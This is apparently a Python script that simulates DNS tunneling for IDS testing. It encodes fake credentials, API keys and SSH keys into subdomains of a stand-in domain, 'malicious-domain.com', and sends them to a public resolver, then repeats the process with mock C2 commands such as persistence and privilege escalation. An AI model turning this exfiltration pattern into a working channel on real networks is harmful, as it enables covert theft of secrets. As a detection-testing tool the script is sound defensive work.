#!/usr/bin/env python3
"""
DNS Tunneling Attack Simulation
Simulates data exfiltration through DNS queries
"""

import socket
import time
import base64
import random

class DNSTunnelSimulator:
    def __init__(self, target_domain="example.com"):
        self.target_domain = target_domain
        self.dns_server = "8.8.8.8"  # Google DNS
        
    def encode_data(self, data):
        """Encode data in base64 for DNS subdomain"""
        encoded = base64.b64encode(data.encode()).decode()
        # Remove padding and limit length
        return encoded.replace('=', '').replace('+', '-').replace('/', '_')[:50]
    
    def create_dns_query(self, subdomain):
        """Create a DNS query with encoded data"""
        query = f"{subdomain}.{self.target_domain}"
        return query
    
    def send_dns_query(self, query):
        """Send DNS query"""
        try:
            # Create UDP socket for DNS
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            # Simple DNS query structure (simplified)
            dns_query = query.encode() + b'\x00'
            
            # Send to DNS server
            sock.sendto(dns_query, (self.dns_server, 53))
            
            # Try to receive response
            try:
                response, _ = sock.recvfrom(1024)
                return True
            except socket.timeout:
                return False
            finally:
                sock.close()
                
        except Exception as e:
            print(f"Error sending DNS query: {e}")
            return False
    
    def simulate_data_exfiltration(self, data_chunks=20):
        """Simulate exfiltrating data through DNS queries"""
        print(f"[*] Starting DNS tunneling simulation to {self.target_domain}")
        print("[*] Simulating data exfiltration...")
        
        # Sample data to exfiltrate
        sample_data = [
            "user_credentials=admin:password123",
            "database_connection=192.168.1.100:3306",
            "api_key=sk-1234567890abcdef",
            "sensitive_data=confidential_document.pdf",
            "internal_ip=10.0.0.50",
            "ssh_key=ssh-rsa AAAAB3NzaC1yc2E...",
            "config_file=/etc/secret.conf",
            "user_list=user1,user2,user3"
        ]
        
        for i in range(data_chunks):
            # Select random data chunk
            data = random.choice(sample_data) + f"_chunk_{i}"
            
            # Encode data
            encoded = self.encode_data(data)
            
            # Create DNS query
            query = self.create_dns_query(encoded)
            
            # Send query
            success = self.send_dns_query(query)
            
            if success:
                print(f"[+] DNS query sent: {query[:30]}... (chunk {i+1}/{data_chunks})")
            else:
                print(f"[-] DNS query failed: {query[:30]}...")
            
            # Small delay to simulate realistic exfiltration
            time.sleep(0.5)
        
        print("[*] DNS tunneling simulation complete")
    
    def simulate_command_and_control(self, commands=10):
        """Simulate C2 communication through DNS"""
        print(f"\n[*] Starting DNS C2 simulation")
        print("[*] Simulating command and control...")
        
        # Sample C2 commands
        c2_commands = [
            "ping",
            "status",
            "upload_data",
            "download_payload",
            "execute_script",
            "scan_network",
            "exfil_data",
            "persistence",
            "priv_escalate",
            "cleanup"
        ]
        
        for i in range(commands):
            cmd = random.choice(c2_commands)
            query_id = f"cmd_{i}_{random.randint(1000, 9999)}"
            
            # Create C2 query
            query = self.create_dns_query(f"{query_id}_{self.encode_data(cmd)}")
            
            # Send query
            success = self.send_dns_query(query)
            
            if success:
                print(f"[+] C2 command sent: {cmd}")
            else:
                print(f"[-] C2 command failed: {cmd}")
            
            time.sleep(1)
        
        print("[*] DNS C2 simulation complete")

def main():
    print("=== DNS Tunneling Attack Simulation ===")
    print("This simulates data exfiltration and C2 through DNS queries")
    print("Watch the IDS dashboard for detection!\n")
    
    simulator = DNSTunnelSimulator("malicious-domain.com")
    
    while True:
        print("\nSelect simulation:")
        print("1. Data Exfiltration (20 chunks)")
        print("2. Command & Control (10 commands)")
        print("3. Both (sequential)")
        print("4. Exit")
        
        choice = input("\nEnter choice (1-4): ")
        
        if choice == "1":
            simulator.simulate_data_exfiltration(20)
        elif choice == "2":
            simulator.simulate_command_and_control(10)
        elif choice == "3":
            simulator.simulate_data_exfiltration(10)
            simulator.simulate_command_and_control(5)
        elif choice == "4":
            break
        else:
            print("Invalid choice")
        
        print("\nCheck your IDS dashboard for alerts!")
        time.sleep(2)

if __name__ == "__main__":
    main()
